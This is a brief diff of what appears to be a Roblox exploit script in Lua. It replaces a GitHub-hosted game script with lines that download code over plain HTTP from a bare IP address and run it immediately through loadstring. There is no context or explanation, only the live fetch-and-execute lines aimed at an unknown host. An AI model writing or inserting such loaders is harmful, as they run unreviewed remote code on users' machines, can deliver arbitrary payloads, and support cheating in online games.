@@ -1,4 +1,4 @@
 ID="86fb3615-fda6-45c6-b6e9-1c789545950a";
-RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))();
+RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LucasggkX/Games/refs/heads/main/Paintball.lua"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
